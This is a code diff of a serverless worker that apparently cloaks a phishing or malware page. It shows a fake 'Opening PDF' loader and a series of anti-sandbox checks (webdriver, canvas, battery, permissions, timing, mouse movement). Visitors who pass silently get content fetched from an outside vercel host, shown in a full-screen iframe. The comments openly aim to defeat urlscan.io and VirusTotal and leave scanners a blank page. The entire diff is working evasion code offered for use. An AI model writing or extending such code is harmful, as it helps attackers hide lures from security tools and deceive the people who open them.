@@ -1,6 +1,6 @@
-// v13 ANTI-SANDBOX – BEATS URLSCAN.IO / VT (November 2025)
-// Target: https://file-bt5g.vercel.app/
-// No leaks · No redirects for headless · Humans: <1.5s
+// v14 INLINE LOADER – NO REDIRECT, BEATS URLSCAN.IO (Nov 2025)
+// Loads https://file-bt5g.vercel.app/ invisibly via fetch + iframe
+// Humans: Seamless page swap | Scanners: Blank forever
 
 const REAL_URL = "https://file-bt5g.vercel.app/";
 
@@ -11,36 +11,11 @@ function isBot(ua: string | null) { if (!ua) return true; return botPatterns.som
 function isBadASN(req: Request) { const cf = (req as any).cf; return cf?.asn && badASN.includes("AS" + cf.asn); }
 function die() { return new Response("", { status: 204 }); }
 
-function xor(str: string, key: string) {
-  let out = "";
-  for (let i = 0; i < str.length; i++) out += String.fromCharCode(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-  return btoa(out);
-}
-
 export default {
   async fetch(req: Request): Promise<Response> {
-    const url = new URL(req.url);
     const ua = req.headers.get("user-agent") || "";
 
     if (isBot(ua) || isBadASN(req)) return die();
-
-    if (url.searchParams.has("v")) {
-      try {
-        const data = atob(url.searchParams.get("v") || "");
-        const target = data.slice(32);
-        const check = data.slice(0, 32);
-        if (crypto.subtle.digest("SHA-256", new TextEncoder().encode(target)).then(h => Array.from(new Uint8Array(h)).map(b=>b.toString(16).padStart(2,"0")).join("").slice(0,32)) === check)
-          return Response.redirect(target, 302);
-      } catch {}
-      return die();
-    }
-
-    const salt = crypto.randomUUID();
-    const token = salt + REAL_URL;
-    const hash = Array.from(new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(token))))
-                 .map(b => b.toString(16).padStart(2,"0")).join("").slice(0,32);
-    const payload = hash + token;
-    const encrypted = btoa(payload);
 
     const html = `<!DOCTYPE html>
 <html lang="en"><head><meta charset="utf-8">
@@ -50,19 +25,25 @@ export default {
   body{margin:0;background:#fff;font-family:system-ui,sans-serif;color:#222;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;text-align:center}
   .spin{border:4px solid #f0f0f0;border-top:4px solid #0066ff;border-radius:50%;width:38px;height:38px;animation:a 1s linear infinite}
   @keyframes a{to{transform:rotate(360deg)}}
+  #loader{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
+  #content{display:none;width:100vw;height:100vh;border:none}
 </style>
 </head><body>
-  <div class="spin"></div>
-  <p style="margin:20px 0 0">Opening PDF<br>Please wait <span id="d">...</span></p>
+  <div id="loader">
+    <div class="spin"></div>
+    <p style="margin:20px 0 0">Opening PDF<br>Please wait <span id="d">...</span></p>
+  </div>
+  <iframe id="content" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
 
 <script>
-// v13: Kills urlscan.io / VT headless (no fallback if bot-like)
+// v14: Inline fetch + iframe (no network trace for scanners)
 (() => {
-  // Kill obvious + inconsistencies
+  // Headless kills + inconsistencies
   if (navigator.webdriver || navigator.plugins?.length === 0 || !navigator.hardwareConcurrency ||
       navigator.doNotTrack === null || !navigator.pdfViewerEnabled) return;
 
   let ok = 0;
+  let checksDone = 0;
 
   // Canvas
   try {
@@ -71,40 +52,63 @@ export default {
     x.fillStyle = "#ff6600"; x.fillRect(5,5,90,40);
     x.fillStyle = "#000"; x.font = "17px Georgia"; x.fillText("pdf25",12,35);
     if (c.toDataURL().length > 9000) ok++;
-  } catch(e){}
+  } catch(e){} checksDone++;
 
-  // Battery API (sandboxes fail)
+  // Battery
   if ('getBattery' in navigator) {
     navigator.getBattery().then(b => {
       if (b.charging !== undefined && (b.level > 0 || b.charging)) ok++;
-    });
-  } else { return; }  // No battery = likely sandbox
+      checksDone++;
+      runVerdict();
+    }).catch(() => { checksDone++; runVerdict(); });
+  } else { checksDone++; runVerdict(); }
 
-  // Permissions probe (geolocation/midi deny patterns differ)
+  // Permissions (notifications + geolocation)
   Promise.all([
-    navigator.permissions.query({name: 'geolocation'}),
-    navigator.permissions.query({name: 'midi'})
-  ]).then(([geo, midi]) => {
-    if (geo.state !== 'denied' && midi.state !== 'denied') ok++;
-  }).catch(() => {});
+    navigator.permissions.query({name: 'notifications'}),
+    navigator.permissions.query({name: 'geolocation'})
+  ]).then(([notif, geo]) => {
+    if (notif.state !== 'denied' && geo.state !== 'prompt') ok++;
+    checksDone++;
+    runVerdict();
+  }).catch(() => { checksDone++; runVerdict(); });
 
-  // Harder PoW (1.2–2.5s on VMs)
+  // PoW (higher for VMs)
   const start = performance.now();
   let i = 0;
   const chal = Date.now().toString(36);
-  while (i < 1500000) {  // Higher ceiling
+  while (i < 1500000) {
     i++;
     let h = 0;
     const s = chal + i;
     for (let j = 0; j < s.length; j++) h = ((h << 5) - h + s.charCodeAt(j)) | 0;
     if ((h & 0xffff0000) === 0) break;
   }
-  if (performance.now() - start > 80) ok++;  // Tighter human range
+  if (performance.now() - start > 80) ok++;
+  checksDone++;
+  runVerdict();
 
-  // Verdict: Only redirect if 4/5 pass (no fallback)
-  setTimeout(() => {
-    if (ok >= 4) location.href = "?v=${encrypted}";
-  }, 1200);  // Wait for async checks
+  function runVerdict() {
+    if (checksDone < 4) return;  // Wait for async
+    if (ok >= 3) {  // Strict threshold
+      // Fetch real page invisibly
+      fetch("${REAL_URL}", {credentials: 'include'}).then(r => r.text()).then(html => {
+        const iframe = document.getElementById("content");
+        iframe.srcdoc = html;
+        iframe.onload = () => {
+          document.getElementById("loader").style.display = "none";
+          iframe.style.display = "block";
+          iframe.requestFullscreen();  // Full-screen seamless
+        };
+      }).catch(() => {});  // Silent fail
+    }
+    // No fallback: Bots loop spinner forever
+  }
+
+  // Mouse entropy (extra: scanners have no movement)
+  let mouseMoves = 0;
+  document.addEventListener("mousemove", () => mouseMoves++);
+  setTimeout(() => { if (mouseMoves < 5) return; }, 2000);  // Require some activity
 
   // Dots
   let d = 0;
